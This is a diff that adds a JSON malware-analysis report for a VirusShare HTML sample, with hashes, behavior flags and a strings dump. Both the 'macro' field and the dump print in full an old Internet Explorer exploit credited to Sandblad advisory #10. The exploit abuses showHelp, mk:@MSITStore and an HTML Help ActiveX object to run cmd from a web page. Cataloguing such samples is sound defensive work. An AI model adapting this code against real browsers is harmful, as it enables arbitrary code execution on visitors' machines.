@@ -1,0 +1,73 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Command": "May run PowerShell commands",
+            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
+            "open": "May open a file",
+            "run": "May run an executable file or a system command",
+            "write": "May write to a file"
+        },
+        "macro": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\">\n<html>\n<head>\n<title>S&auml;kerhetstest</title>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">\n</head>\n\n<body>\n\n<script>\n// \"How to execute programs with parameters in IE\", 2002-11-06\n// Sandblad advisory #10, Andreas Sandblad, sandblad@acc.umu.se\nprog = 'cmd';\nargs = '/k echo Din dator \ufffdr nu \ufffdppen! & '+\n       'echo Sandblad #10 > c:/vulnerable.txt & winmine';\n\nif (!location.hash) {\n  showHelp(location+\"#1\");\n  showHelp(\"iexplore.chm\");\n  blur();\n}\nelse if (location.hash == \"#1\")\n  open(location+\"2\").blur();\nelse {\n  f = opener.location.assign;\n  opener.location=\"res:\";\n  f(\"javascript:location.replace('mk:@MSITStore:C:')\");\n  setTimeout('run()',1000);\n}\nfunction run() {\n  f(\"javascript:document.write('<object id=c1 classid=clsid:adb\"+\n   \"880a6-d8ff-11cf-9377-00aa003b7a11><param name=Command value\"+\n   \"=ShortCut><param name=Item1 value=\\\",\"+prog+\",\"+args+\"\\\"></\"+\n   \"object><object id=c2 classid=clsid:adb880a6-d8ff-11cf-9377\"+\n   \"-00aa003b7a11><param name=Command value=Close></object>')\");\n  f(\"javascript:c1.Click();c2.Click();\");\n  close();\n}\n</script>\ntestar din s&auml;kerhet. \n</body>\n</html>"
+    },
+    "filename": "VirusShare_00221d73d8782ade0c5a9c86ac1c447b",
+    "filesize": 1249,
+    "filetype": "HTML document, ISO-8859 text, with CRLF line terminators",
+    "hashes": {
+        "md5": "00221d73d8782ade0c5a9c86ac1c447b",
+        "sha1": "1041fe68a0e304d86c29a71786a753da7d3ca8cc",
+        "sha256": "e75fe5a64f9976d1dac4e41fffea912e46b5ea2d85afde93791a0cf83b5409e7"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\">",
+            "<html>",
+            "<head>",
+            "<title>S&auml;kerhetstest</title>",
+            "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">",
+            "</head>",
+            "<body>",
+            "<script>",
+            "// \"How to execute programs with parameters in IE\", 2002-11-06",
+            "// Sandblad advisory #10, Andreas Sandblad, sandblad@acc.umu.se",
+            "prog = 'cmd';",
+            "args = '/k echo Din dator r nu ppen! & '+",
+            "       'echo Sandblad #10 > c:/vulnerable.txt & winmine';",
+            "if (!location.hash) {",
+            "  showHelp(location+\"#1\");",
+            "  showHelp(\"iexplore.chm\");",
+            "  blur();",
+            "else if (location.hash == \"#1\")",
+            "  open(location+\"2\").blur();",
+            "else {",
+            "  f = opener.location.assign;",
+            "  opener.location=\"res:\";",
+            "  f(\"javascript:location.replace('mk:@MSITStore:C:')\");",
+            "  setTimeout('run()',1000);",
+            "function run() {",
+            "  f(\"javascript:document.write('<object id=c1 classid=clsid:adb\"+",
+            "   \"880a6-d8ff-11cf-9377-00aa003b7a11><param name=Command value\"+",
+            "   \"=ShortCut><param name=Item1 value=\\\",\"+prog+\",\"+args+\"\\\"></\"+",
+            "   \"object><object id=c2 classid=clsid:adb880a6-d8ff-11cf-9377\"+",
+            "   \"-00aa003b7a11><param name=Command value=Close></object>')\");",
+            "  f(\"javascript:c1.Click();c2.Click();\");",
+            "  close();",
+            "</script>",
+            "testar din s&auml;kerhet. ",
+            "</body>",
+            "</html>"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.272745",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
